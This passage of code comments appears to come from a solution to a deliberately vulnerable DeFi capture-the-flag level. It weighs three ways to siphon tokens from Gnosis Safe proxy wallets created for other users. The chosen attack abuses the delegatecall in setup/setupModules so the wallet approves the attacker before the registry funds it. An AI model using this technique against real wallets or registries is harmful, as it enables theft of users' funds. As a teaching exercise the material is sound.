        // The idea is to create 4 wallets associated to each user using createProxyWithNonce of the factory. This will allow the registry to send back 10 tokens to each wallet, and at the same time add each SINGLE user as beneficiary. To be able to initiate any user as the owner of a wallet, the setup() function of the GnosisSafe masterCopy contract needs to be called. Calling it simply will definitely set up the owners. 
        // However, we need to do something more. We need to be able to send the tokens from each wallet to the player account. As the function setup is set up now, there are 3 ways to pull this off :

        // 1: Set up the fallbackHandler in the setup, create the proxy wallet. After receiving the funds from the WalletRegistry. Send another tx with calldata to the proxy which should fallback to the gnosisSafe and triggers the fallback function of the FallbackManager which executes a low level CALL to the handler by calling the function defined in the calldata. The solution would be to set the fallbackHandler as the address of the DamnValuableToken token contract. After the create is complete, send a tx call to the proxy with calldata equal to the selector of the transfer function to the recipient which is the player. 
        // @note This solution would not work due to this condition inside the WalletRegistry :         
        // address fallbackManager = _getFallbackManager(walletAddress);
        // if (fallbackManager != address(0))
        // revert InvalidFallbackManager(fallbackManager);
        // Let's check other ways :

        // 2nd solution : This would require to create the wallets with 2 owners instead of one. One being the original users and the second owner would be the player for each wallet. After the creation, the player would need to immediately sign a tx to send the tokens from the newly created wallets to his account.
        // @note This solution would require the user to send more than 1 tx, but we expect only 1 tx for this level. 

        // 3rd solution : The setup() function calls setupModules(to, data); which executes :
        // require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000"); in the moduleManager and in return the execute() function does this :
        // success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0) in the Executor contract.
        // We can have setup() do the delegate call as long as to # address(0) and the data make sense. Since this will do a delegate call, the calls will be executed in the context of the proxy. Also this delegateCall will happen BEFORE the tokens are transfered to the wallet. The only way to transfer the tokens after they are received is to make the wallet approve our address. To pull this off, we will have the proxy, when calling setup, delegate to our contract which has a function that calls token.approve() with the player address and the wallet token balance as arguments. Then when the registry sends the funds to the proxy wallet, we can safely calls transferfrom to send the funds from the proxy to us.
